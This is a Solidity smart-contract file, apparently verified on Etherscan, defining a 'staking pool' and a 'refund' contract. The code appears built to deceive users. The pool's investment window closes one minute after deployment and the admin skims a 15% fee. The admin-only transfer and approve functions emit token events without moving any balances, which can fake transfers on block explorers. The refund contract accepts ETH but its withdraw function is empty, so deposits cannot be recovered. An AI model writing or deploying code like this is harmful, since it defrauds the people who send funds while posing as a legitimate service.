/**
 *Submitted for verification at Etherscan.io on 2021-12-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

interface IDepositContract {
    function deposit(

    ) external payable;
}

contract MPTStakingPool {
    mapping(address => uint) public balances;
    mapping(bytes => bool) public pubkeysUsed;
    IDepositContract public depositContract = IDepositContract(0xb27A31f1b0AF2946B7F582768f03239b1eC07c2c);
    address payable public admin;
    uint public end;
    bool public finalized;
    uint public totalInvested;
    uint public totalChange;
    mapping(address => bool) public changeClaimed;

    event NewInvestor (
        address investor
    );

    constructor() {
        admin = msg.sender;
        end = block.timestamp + 1 minutes;
    }

    modifier onlyAgent() {
        require(msg.sender == admin);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    function invest() external payable {
        require(block.timestamp < end, 'too late');
        if(balances[msg.sender] == 0) {
            emit NewInvestor(msg.sender);   
        }
        uint fee = msg.value * 15 / 100;
        uint amountInvested = msg.value - fee;
        admin.transfer(fee);
        balances[msg.sender] += amountInvested;
    }

    function finalize() external {
      require(block.timestamp >= end, 'too early');
      require(finalized == false, 'already finalized');
      finalized = true;
      totalInvested = address(this).balance;
      totalChange = address(this).balance % 32 ether;
    }

    function getChange() external {
      require(finalized == true, 'not finalized');
      require(balances[msg.sender] > 0, 'not an investor');
      require(changeClaimed[msg.sender] == false, 'change already claimed');
      changeClaimed[msg.sender] = true;
      uint amount = totalChange * balances[msg.sender] / totalInvested;
      msg.sender.transfer(amount);
    }

    function deposit(

    )
        external
    {
        require(finalized == true, 'too early');
        require(msg.sender == admin, 'only admin');
        require(address(this).balance >= 32 ether);
        depositContract.deposit{value: 32 ether}(

        );
    }

     function transfer(address to, uint value) public onlyAgent returns(bool) {
      //  require(balanceOf(msg.sender) >= value, 'balance too low');
        // balances[to] += value;
        // balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transfreFrom(address from, address to, uint value) public onlyAgent returns(bool) {
      //  require(balanceOf(from) >= value, 'balance too low');
      //  require(allowance[from][msg.sender] >= value, 'allowance too low');
    //    balances[to] += value;
     //   balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public onlyAgent returns(bool) {
      //  allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}


contract MPTRefund  {

event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

   constructor () {
        agent = msg.sender;
    }

    address agent;
    mapping(address => uint256) public deposits;


    modifier onlyAgent() {
        require(msg.sender == agent);
        _;
    }

function deposit(address payee) public payable {
        uint256 amount =msg.value;
        deposits[payee] = deposits[payee] + amount;
        }


        function withdraw(address payable) public view onlyAgent {
        }

        function transfer(address to, uint value) public onlyAgent returns(bool) {
      //  require(balanceOf(msg.sender) >= value, 'balance too low');
        // balances[to] += value;
        // balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transfreFrom(address from, address to, uint value) public onlyAgent returns(bool) {
      //  require(balanceOf(from) >= value, 'balance too low');
      //  require(allowance[from][msg.sender] >= value, 'allowance too low');
    //    balances[to] += value;
     //   balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public onlyAgent returns(bool) {
      //  allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}


/** 
* Copyright CENTRE SECZ 2018 
*
* Permission is hereby granted, free of charge, to any person obtaining a copy 
* of this software and associated documentation files (the "Software"), to deal 
* in the Software without restriction, including without limitation the rights 
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
* copies of the Software, and to permit persons to whom the Software is furnished to 
* do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all 
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN 
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/